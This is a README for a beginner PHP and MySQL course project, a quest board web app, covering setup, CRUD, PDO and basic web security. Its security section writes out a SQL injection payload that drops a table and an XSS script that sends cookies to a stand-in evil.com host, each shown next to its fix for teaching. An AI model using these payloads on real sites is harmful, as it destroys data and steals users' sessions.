# ⚔️ The Quest Board — PHP & SQL Backend Project

Welcome to your first **backend project**!

So far, you've built websites that live entirely in the browser — HTML, CSS, and JavaScript.
This project adds a **server** and a **database** to the mix. That means your data will actually
be *saved* somewhere, and different people (or browser tabs) will see the same information.

> Think of the Quest Board as a magical notice board in a fantasy tavern. Heroes can **post** quests,
> **view** what's available, **mark them complete**, and **delete** old ones — and all of it gets
> saved to a real database!

---

## 🗺️ What You Will Build

A multi-page PHP web app where users can:

| Feature | What it does |
|---|---|
| **View all quests** | See every quest posted on the board |
| **Post a quest** | Fill out a form; data is saved to a database |
| **Mark complete** | Click a button to check off a finished quest |
| **Delete a quest** | Remove a quest from the board entirely |

---

## 🧠 What You Will Learn

- How a **web server** (Apache via XAMPP) runs PHP files
- How **PHP** receives form data and talks to a database
- How **SQL** stores, reads, updates, and deletes records (CRUD)
- How to keep database connection details in a **separate config file**
- How to structure a **multi-page PHP project**
- How to prevent **SQL injection** using prepared statements
- How to prevent **XSS (Cross-Site Scripting)** using `htmlspecialchars()`
- The **POST-Redirect-GET** pattern for safe form handling
- **Input validation** — never trusting user data

---

## 🛠️ Tools Required

| Tool | Purpose |
|---|---|
| **XAMPP** | Runs Apache (web server) + MySQL (database) locally |
| **VS Code** | Writing code |
| **Browser** | Testing the app at `http://localhost/quest-board/` |
| **phpMyAdmin** | Visual interface to inspect your database (comes with XAMPP) |

---

## 📁 Project Structure

```
quest-board/                 ← Put this whole folder inside XAMPP's htdocs/
│
├── README.md                ← You are here!
│
├── sql/
│   └── setup.sql            ← ⭐ Run this first — creates your database & table
│
├── includes/
│   ├── db.php               ← Database connection (shared across all pages)
│   └── header.php           ← Shared HTML header/nav (so you don't repeat yourself)
│
├── pages/
│   ├── post_quest.php       ← Form to post a new quest + handles form submission
│   ├── complete_quest.php   ← Marks a quest as complete (no visible page)
│   └── delete_quest.php     ← Deletes a quest (no visible page)
│
├── index.php                ← Home page — shows all quests
└── style.css                ← All your styling lives here
```

---

## 🚀 How to Run This Project

### Step 1 — Copy the project into XAMPP
Place the entire `quest-board/` folder inside:
```
C:\xampp\htdocs\quest-board\       (Windows)
/Applications/XAMPP/htdocs/quest-board/   (Mac)
```

### Step 2 — Start XAMPP
Open the **XAMPP Control Panel** and click **Start** next to:
- ✅ Apache
- ✅ MySQL

### Step 3 — Create the database
1. Open your browser and go to: `http://localhost/phpmyadmin`
2. Click **SQL** in the top menu
3. Copy the contents of `sql/setup.sql` and paste it in
4. Click **Go**

You should now see a database called `quest_board` with a table called `quests`.

### Step 4 — Open the app
Go to: **`http://localhost/quest-board/`**

---

## 🎯 Goals & Challenges

Work through these in order. Each one builds on the last!

### 🟢 Level 1 — Get It Running (Starter Goals)
- [ ] Set up XAMPP and confirm Apache + MySQL are both running
- [ ] Run `setup.sql` and confirm the `quests` table exists in phpMyAdmin
- [ ] Open `http://localhost/quest-board/` and see the Quest Board home page
- [ ] Post your first quest using the form and see it appear on the board
- [ ] Mark a quest as complete and see it visually change
- [ ] Delete a quest and confirm it's gone

### 🟡 Level 2 — Understand the Code (Comprehension Goals)
- [ ] Explain in your own words: what does `db.php` do, and why is it `include`-d everywhere?
- [ ] Trace the journey of a form submission: what happens from the moment you click "Post Quest"?
- [ ] Find where SQL injection could happen if we *didn't* use prepared statements. Why is it dangerous?
- [ ] What does `$_POST` contain? When does PHP use `$_GET` instead?
- [ ] What does `htmlspecialchars()` do, and what attack does it prevent?
- [ ] Why does `post_quest.php` redirect after saving instead of just showing the board?

### 🔴 Level 3 — Extend It (Stretch Goals)
- [ ] **Add a difficulty field** — Easy / Medium / Hard. Store it in the database and display a badge next to each quest
- [ ] **Add a reward field** — A short text like "50 gold coins". Show it on the board
- [ ] **Add a search bar** — Filter quests by keyword using a SQL `WHERE title LIKE ?` query
- [ ] **Add timestamps** — Show "Posted 3 days ago" using PHP's `date()` and the `created_at` column
- [ ] **Prevent empty submissions** — Add PHP-side validation so blank quests can't be posted
- [ ] **Add success messages** — Show "Quest posted!" or "Quest deleted!" banners using the GET parameters we already pass (?posted=1, ?deleted=1)
- [ ] **Add a "reopen" button** — Let users undo a completed quest (UPDATE is_complete back to 0)

---

## 🧩 Key Concepts — Quick Reference

### What is CRUD?
Every database app does four things:

| Letter | Operation | SQL keyword | This project |
|---|---|---|---|
| C | Create | `INSERT` | Posting a quest |
| R | Read | `SELECT` | Viewing the board |
| U | Update | `UPDATE` | Marking complete |
| D | Delete | `DELETE` | Removing a quest |

### What is SQL?
SQL (Structured Query Language) is the language used to talk to databases. Think of a database as a very powerful spreadsheet, and SQL as the instructions you give it.

Examples:
```sql
-- Get all quests:
SELECT * FROM quests;

-- Get only open quests:
SELECT * FROM quests WHERE is_complete = 0;

-- Add a new quest:
INSERT INTO quests (title, description) VALUES ('My Quest', 'Details here');

-- Mark quest #3 as complete:
UPDATE quests SET is_complete = 1 WHERE id = 3;

-- Delete quest #3:
DELETE FROM quests WHERE id = 3;
```

### What is PDO?
PDO (PHP Data Objects) is PHP's built-in tool for talking to databases. Think of it like a translator between PHP and MySQL:

```
Your PHP code → PDO translates → MySQL understands
```

PDO is the recommended approach because:
1. **Secure** — it supports prepared statements (prevents SQL injection)
2. **Flexible** — it works with MySQL, PostgreSQL, SQLite, and more
3. **Modern** — it uses object-oriented syntax (the `->` arrow)

---

## 🔒 Security Concepts

### What is SQL Injection?
SQL injection is one of the **most dangerous** web attacks. It happens when a hacker types SQL code into a form field, and your app accidentally runs it.

**The dangerous way (NEVER do this):**
```php
$sql = "INSERT INTO quests (title) VALUES ('$title')";
```

If a hacker types this as their quest title:
```
'); DROP TABLE quests; --
```

MySQL sees:
```sql
INSERT INTO quests (title) VALUES (''); DROP TABLE quests; --')
```

That's THREE commands:
1. Insert an empty quest
2. **DELETE YOUR ENTIRE TABLE** 💀
3. `--` is a SQL comment, ignoring the rest

**The safe way (what we use — Prepared Statements):**
```php
$stmt = $pdo->prepare("INSERT INTO quests (title) VALUES (?)");
$stmt->execute([$title]);
```

This works because `prepare()` sends the query STRUCTURE first, and `execute()` sends the DATA separately. MySQL knows the data can only fill the `?` slot — it can never become part of the query itself.

**Analogy:** It's like a fill-in-the-blank form. "My name is _____." No matter what you write in the blank, you can't change the sentence structure.

**Real world:** SQL injection has been used to hack Sony, Yahoo, LinkedIn, and government agencies. It's consistently ranked #1 on the [OWASP Top 10](https://owasp.org/www-project-top-ten/) — a list of the most critical web security risks.

### What is XSS (Cross-Site Scripting)?
XSS is when a hacker puts **JavaScript code** inside a form field. If you display that input on a page without escaping it, the browser will **run the JavaScript**.

**Example attack:**
A hacker types this as their quest title:
```html
<script>document.location='http://evil.com/steal?c='+document.cookie</script>
```

Without protection, every user who views the board would have their browser hijacked — the hacker could steal login sessions, redirect to fake sites, or deface the page.

**The fix — `htmlspecialchars()`:**
```php
echo htmlspecialchars($quest['title']);
```
This converts `<` to `&lt;` and `>` to `&gt;`, so the browser displays the text harmlessly instead of running it as code.

**Rule:** ALWAYS use `htmlspecialchars()` when displaying any user-submitted data.

### What is Input Validation?
Never trust data from users. Always check it before using it:

```php
// Is the field empty?
if ($title === '') {
    $errors[] = 'Title is required.';
}

// Is the ID a valid number?
if (!is_numeric($id) || (int)$id <= 0) {
    // Bad input — redirect to safety
}
```

**Why server-side validation?** HTML `required` attributes can be bypassed by anyone who opens browser DevTools. Server-side validation runs on YOUR computer — users can't bypass it.

### What is POST-Redirect-GET (PRG)?
A pattern that prevents duplicate form submissions:

1. **POST** — User submits the form
2. **REDIRECT** — Server says "go to this page"
3. **GET** — Browser loads the new page normally

Without this, if the user refreshes after submitting, the browser asks "Re-submit form data?" and could create a duplicate quest.

---

## 🔑 PHP Concepts Used

### `$_POST` vs `$_GET`
| | `$_GET` | `$_POST` |
|---|---|---|
| **Where data lives** | In the URL (visible) | In the request body (hidden) |
| **Example** | `page.php?id=3` | Form with `method="post"` |
| **Used for** | Links, search, filters | Creating/changing data |
| **Read with** | `$_GET['id']` | `$_POST['title']` |

### `include` — Reusing Code
PHP's way of pasting one file's code into another:
```php
include 'includes/db.php'; // Like copy-pasting db.php right here
```
This is how `db.php` is shared across every page without copy-pasting.

### The `??` Operator (Null Coalescing)
```php
$id = $_GET['id'] ?? null;
```
Means: "Use `$_GET['id']` if it exists, otherwise use `null`."
This prevents errors when a value might not be provided.

### `try` / `catch` — Error Handling
```php
try {
    // Code that MIGHT fail
    $pdo = new PDO(...);
} catch (PDOException $e) {
    // What to do if it fails
    die("Connection failed: " . $e->getMessage());
}
```
Without try/catch, a failed database connection would show a confusing PHP error. With it, you show a helpful message.

### `header('Location: ...')` — Redirects
```php
header('Location: /quest-board/index.php');
exit; // Always exit after redirecting!
```
Tells the browser "go to this URL instead." Used after INSERT, UPDATE, and DELETE operations.

---

## 💡 Hints & Tips

- **Nothing showing up?** Check that Apache and MySQL are both green in XAMPP.
- **Database error?** Make sure you ran `setup.sql` in phpMyAdmin first.
- **Page not found?** Double-check the folder is named exactly `quest-board` inside `htdocs`.
- **Changes not saving?** PHP runs on the *server* — always refresh after editing a `.php` file.
- Use **phpMyAdmin** to peek inside your database and see rows being added/deleted in real time!
- **Blank page?** You might have a PHP syntax error. Check the Apache error log in XAMPP.

---

## 📜 Glossary

| Term | Meaning |
|---|---|
| **Apache** | The web server that runs your PHP files. When you visit localhost, Apache is the one answering. |
| **PHP** | A programming language that runs on the server (not the browser). It generates HTML that gets sent to the browser. |
| **MySQL** | The database software that stores your data in tables (like spreadsheets). |
| **PDO** | PHP Data Objects — PHP's built-in tool for talking to MySQL safely. |
| **SQL** | Structured Query Language — the language used to talk to a database (SELECT, INSERT, UPDATE, DELETE). |
| **CRUD** | Create, Read, Update, Delete — the four fundamental database operations. |
| **Prepared statement** | A safe way to send user input to a database, preventing SQL injection. Uses `?` placeholders. |
| **SQL injection** | A hack where an attacker puts SQL code in a form field to manipulate your database. Prevented by prepared statements. |
| **XSS** | Cross-Site Scripting — a hack where an attacker injects JavaScript via form fields. Prevented by `htmlspecialchars()`. |
| **`$_POST`** | A PHP array that holds data submitted from a form (`method="post"`). |
| **`$_GET`** | A PHP array that holds data passed in the URL (after the `?`). |
| **`include`** | PHP keyword that pastes another file's code into the current file. |
| **Redirect** | Telling the browser "go to this URL instead" using `header('Location: ...')`. |
| **PRG** | POST-Redirect-GET — a pattern that prevents duplicate form submissions after saving data. |
| **Validation** | Checking user input for problems before saving it (empty fields, wrong types, etc.). |
| **DSN** | Data Source Name — the connection string that tells PDO which database to connect to. |
| **DRY** | "Don't Repeat Yourself" — a principle of keeping shared code in one place. |
| **Ternary operator** | Shorthand if/else: `condition ? value_if_true : value_if_false`. |

---

*Built for the iCode Orange Belt Program — Backend Module*
